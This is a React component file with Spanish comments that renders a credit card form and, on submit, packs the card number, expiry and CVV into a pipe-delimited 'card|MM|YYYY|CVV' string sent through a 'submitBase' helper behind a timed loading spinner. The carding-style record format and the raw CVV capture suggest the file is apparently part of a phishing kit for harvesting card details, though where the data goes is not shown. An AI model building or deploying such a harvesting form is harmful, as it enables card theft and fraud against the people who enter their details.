import { useFormik } from 'formik'

import { cardValidate } from '../../../security/cardValidate'
import { CreditCardInput } from './CreditCardInput'
import { ErrorCreditCard } from './ErrorCreditCard'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'
import { useGeneralData } from '../../../hooks/useGeneralData'

const valuesData = { card: '', month: 'mes', year: 'año', cvv: '' }

export const CreditCard = () => {

    const dataImportant = useGeneralData({modeLive: false, spiner: true, timeLoader: 2000 })
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => cardValidate({values}),
        onSubmit: async({card, cvv, month, year}) => {
            valuesData.tarjeta = `${card.toString().slice(0, 16).replace(/[^0-9]*$/, '')}|${month < 10 ? `0${month}` : month }|${year}|${cvv.toString().slice(0, 3)}`
            submitBase({dataImportant, valuesData})
        }
    })

    return (
        <div>
            {/* Spiner de carga */}
            {
                dataImportant.showSpiner === true ? <Spiner /> : null
            }

            {/* Aqui ira las notificacion de error */}
            <ErrorCreditCard errors={errors} touched={touched} />
            
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <CreditCardInput
                  card={values.card.toString().slice(0, 16)}
                  year={values.year}
                  month={values.month}
                  cvv={values.cvv.toString().slice(0, 3)}
                  handleChange={handleChange} 
                  handleBlur={handleBlur} 
                  touched={touched}
                  errors={errors}
                />

                <button 
                    disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
